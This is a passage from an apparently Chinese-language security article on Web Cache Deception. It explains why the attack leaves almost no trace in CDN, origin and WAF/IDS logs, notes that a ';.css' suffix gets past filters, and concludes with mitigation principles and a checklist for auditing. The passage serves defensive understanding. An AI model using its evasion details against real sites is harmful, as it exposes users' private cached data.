**隐蔽性。** 攻击在日志里几乎隐形。CDN 日志里每个请求都是 200 加一个“静态”URL,响应体一两百字节,和正常静态资源没有区别;源站日志里攻击者的匿名请求根本不出现(缓存命中,没回源);WAF 和 IDS 在 URL 里看不到任何注入特征,`;.css` 后缀甚至会被当成正常静态请求放行。唯一可能的痕迹是“同一个 URL 先被带 Cookie 的请求访问、后被匿名访问命中缓存”,但大多数访问日志不记录 Cookie 或请求者身份,这层关联无从建立。这也解释了为什么 WCD 难检测、难取证。

## 十、结论

-   WCD 的风险不在“缓存”本身,而在 **缓存判定和路由判定对同一个 URL 给出不同答案**;
-   收敛方向只有一个:源站说“这是私有数据”,CDN 就不该缓存;CDN 说“这像静态文件”,源站就不该把它当私有接口;
-   具体哪些变体有效,由框架与 CDN 配置共同决定 —— 排查时按“源站命中规则 × CDN 缓存判定 × 缓存键”三条件逐项打勾。
